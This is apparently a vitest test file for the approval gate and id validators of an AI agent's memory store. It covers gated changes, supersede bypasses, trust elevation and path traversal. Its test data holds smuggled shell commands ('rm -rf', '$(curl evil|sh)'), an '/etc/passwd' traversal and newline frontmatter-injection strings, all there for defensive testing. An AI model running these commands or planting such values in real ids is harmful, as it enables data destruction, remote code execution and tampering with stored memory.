import { describe, it, expect } from "vitest";
import { isGated, isGatedChange, targetKey, deriveAction, canonicalMemoryPath, isSafePathSegment, isSafeMemoryId, isWritableMemoryId, hasControlChars } from "../../src/memory/gate.js";
import type { MemoryEntry } from "../../src/memory/types.js";

function mk(over: Partial<MemoryEntry> = {}): MemoryEntry {
  return {
    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p",
    title: "t", summary: "s", path: "", status: "active", confidence: 0.5, importance: 1,
    createdAt: "2026-06-12", updatedAt: "2026-06-12", validFrom: null, validTo: null,
    sourceSessions: [], sourceCommits: [], sourceFiles: [],
    supersedes: null, entities: [], originDevice: null, accessCount: 0, lastAccess: null,
    ...over,
  };
}

describe("isGated", () => {
  it("true for core/procedural/pinned", () => {
    expect(isGated(mk({ type: "core" }))).toBe(true);
    expect(isGated(mk({ type: "procedural" }))).toBe(true);
    expect(isGated(mk({ status: "pinned" }))).toBe(true);
  });
  it("false for ordinary semantic/episodic/working/artifact", () => {
    expect(isGated(mk({ type: "semantic" }))).toBe(false);
    expect(isGated(mk({ type: "episodic" }))).toBe(false);
  });
  it("false for undefined/non-object", () => {
    expect(isGated(undefined)).toBe(false);
    expect(isGated(null)).toBe(false);
    expect(isGated("nope" as unknown as MemoryEntry)).toBe(false);
  });
});

describe("isGatedChange", () => {
  it("gates a directly-gated proposed entry", () => {
    expect(isGatedChange(mk({ id: "core/y", type: "core" }), {})).toBe(true);
  });
  it("gates an in-place edit of an existing gated id", () => {
    const live = { "core/y": mk({ id: "core/y", type: "core" }) };
    expect(isGatedChange(mk({ id: "core/y", type: "semantic" }), live)).toBe(true);
  });
  it("gates a non-gated entry that supersedes a gated id (bypass case)", () => {
    const live = { "core/y": mk({ id: "core/y", type: "core" }) };
    expect(isGatedChange(mk({ id: "semantic/p/z", supersedes: "core/y" }), live)).toBe(true);
  });
  it("ignores a non-string supersedes", () => {
    expect(isGatedChange(mk({ supersedes: 123 as unknown as string }), {})).toBe(false);
  });
  it("ignores an empty-string supersedes", () => {
    const live = { "core/y": mk({ id: "core/y", type: "core" }) };
    expect(isGatedChange(mk({ id: "semantic/p/z", supersedes: "" }), live)).toBe(false);
  });
  it("false for a pure non-gated change", () => {
    expect(isGatedChange(mk({ id: "semantic/p/z" }), {})).toBe(false);
  });
  it("gates elevating an existing entry's trust up to trusted (#23)", () => {
    const live = { "semantic/p/z": mk({ id: "semantic/p/z", trust: "untrusted" }) };
    expect(isGatedChange(mk({ id: "semantic/p/z", trust: "trusted" }), live)).toBe(true);   // untrusted → trusted: gated
    expect(isGatedChange(mk({ id: "semantic/p/z", trust: "untrusted" }), live)).toBe(false); // no elevation
  });
  it("does NOT gate a brand-new trusted entry, nor a downgrade (#23)", () => {
    expect(isGatedChange(mk({ id: "semantic/p/new", trust: "trusted" }), {})).toBe(false); // new, no live predecessor
    const live = { "semantic/p/z": mk({ id: "semantic/p/z", trust: "trusted" }) };
    expect(isGatedChange(mk({ id: "semantic/p/z", trust: "untrusted" }), live)).toBe(false); // downgrade is free
  });
});

describe("targetKey", () => {
  it("= id when no supersedes", () => {
    expect(targetKey(mk({ id: "core/y", supersedes: null }))).toBe("core/y");
  });
  it("= supersedes target when present", () => {
    expect(targetKey(mk({ id: "semantic/p/z", supersedes: "core/y" }))).toBe("core/y");
  });
  it("= id when supersedes is non-string", () => {
    expect(targetKey(mk({ id: "core/y", supersedes: 5 as unknown as string }))).toBe("core/y");
  });
  it("= id when supersedes is an empty string", () => {
    expect(targetKey(mk({ id: "core/y", supersedes: "" }))).toBe("core/y");
  });
});

describe("deriveAction", () => {
  it("replace when supersedes resolves live", () => {
    const live = { "core/y": mk({ id: "core/y", type: "core" }) };
    expect(deriveAction(mk({ id: "core/z", supersedes: "core/y" }), live)).toBe("replace");
  });
  it("update when id exists live", () => {
    const live = { "core/y": mk({ id: "core/y", type: "core" }) };
    expect(deriveAction(mk({ id: "core/y" }), live)).toBe("update");
  });
  it("create otherwise", () => {
    expect(deriveAction(mk({ id: "core/new" }), {})).toBe("create");
  });
});

describe("canonicalMemoryPath", () => {
  it("derives from type/project/id leaf", () => {
    expect(canonicalMemoryPath(mk({ id: "core/user-workflow", type: "core", project: null })))
      .toBe("memory/core/_global/user-workflow.md");
    expect(canonicalMemoryPath(mk({ id: "semantic/code-demo/spool", type: "semantic", project: "code-demo" })))
      .toBe("memory/semantic/code-demo/spool.md");
  });
  it("rejects an invalid type (closes the type-traversal bypass)", () => {
    expect(() => canonicalMemoryPath(mk({ type: "semantic/../core" as unknown as MemoryEntry["type"] })))
      .toThrow(/invalid type/i);
  });
  it("rejects unsafe project / slug segments", () => {
    expect(() => canonicalMemoryPath(mk({ project: "../escape" }))).toThrow(/unsafe project/i);
    expect(() => canonicalMemoryPath(mk({ id: "semantic/.." }))).toThrow(/unsafe slug/i);
  });
  it('rejects a literal "." segment (keeps canonical paths stable)', () => {
    expect(() => canonicalMemoryPath(mk({ project: "." }))).toThrow(/unsafe project/i);
  });
});

describe("isSafePathSegment", () => {
  it("accepts a normal slug, rejects traversal/separators/dot", () => {
    expect(isSafePathSegment("code-demo")).toBe(true);
    expect(isSafePathSegment("..")).toBe(false);
    expect(isSafePathSegment(".")).toBe(false);
    expect(isSafePathSegment("a/b")).toBe(false);
    expect(isSafePathSegment("")).toBe(false);
  });
});

// Round-33: `isWritableMemoryId` and `isSafeMemoryId` answer DIFFERENT questions
// and must not be unified (round-32 unified them and broke every project whose
// directory name contains a space). Write safety = no ASCII control character
// (the frontmatter-injection vector) + no path abuse. Shell safety = the strict
// canonical shape, because the id gets interpolated into a runnable command.
describe("isWritableMemoryId — WRITE safety (control chars + path), not shell safety", () => {
  it("accepts spaces and ordinary punctuation, which cannot forge a frontmatter line", () => {
    for (const id of [
      "semantic/code-my project/some-slug",  // ~/code/my project — projectSlugFromPath does not sanitize
      "semantic/p/slug with space",
      "semantic/p;rm -rf ~/safe",
      "semantic/$(curl evil|sh)/safe",
      "semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c",
    ]) expect([id, isWritableMemoryId(id)]).toEqual([id, true]);
  });

  it("rejects every ASCII control character — the frontmatter-injection vector", () => {
    for (const id of [
      "semantic/p\nforged: value/safe", "semantic/p/safe\nstatus: active",
      "semantic/p\rforged: value/safe", "semantic/p\tq/safe",
      "semantic/p\u0000q/safe", "semantic/p\u007Fq/safe", "semantic/p\u0085q/safe",
    ]) expect([JSON.stringify(id), isWritableMemoryId(id)]).toEqual([JSON.stringify(id), false]);
  });

  it("rejects traversal / empty segments / non-strings / absurdly long ids", () => {
    for (const id of ["", "/", "a//b", "../../etc/passwd", "semantic/../core/x", "a/./b", "/leading", "trailing/", "semantic/p/.."]) {
      expect([id, isWritableMemoryId(id)]).toEqual([id, false]);
    }
    expect(isWritableMemoryId(null)).toBe(false);
    expect(isWritableMemoryId(undefined)).toBe(false);
    expect(isWritableMemoryId(123)).toBe(false);
    expect(isWritableMemoryId("a/" + "x".repeat(400))).toBe(false);
  });

  it("is STRICTLY WEAKER than isSafeMemoryId — never the reverse", () => {
    const shellSafe = ["semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"];
    const writableOnly = ["semantic/code-my project/some-slug", "semantic/p;rm -rf ~/safe"];
    const neither = ["semantic/p\nforged: v/safe", "semantic/p/..", "a//b"];
    for (const id of shellSafe) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, true, true]);
    for (const id of writableOnly) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, false, true]);
    for (const id of neither) expect([id, isSafeMemoryId(id), isWritableMemoryId(id)]).toEqual([id, false, false]);
    // nothing may be shell-safe but unwritable
    for (const id of [...shellSafe, ...writableOnly, ...neither]) {
      if (isSafeMemoryId(id)) expect([id, isWritableMemoryId(id)]).toEqual([id, true]);
    }
  });
});

describe("hasControlChars — shared by the write gate and the renderer backstop", () => {
  it("flags C0 / DEL / C1 and nothing else", () => {
    for (const s of ["a\nb", "a\rb", "a\tb", "a\u0000b", "a\u007Fb", "a\u009Fb"]) {
      expect([JSON.stringify(s), hasControlChars(s)]).toEqual([JSON.stringify(s), true]);
    }
    for (const s of ["", "a b", "semantic/code-my project/x", "a;b|c$(d)", "caf\u00e9", "\u4e2d\u6587"]) {
      expect([s, hasControlChars(s)]).toEqual([s, false]);
    }
  });
});
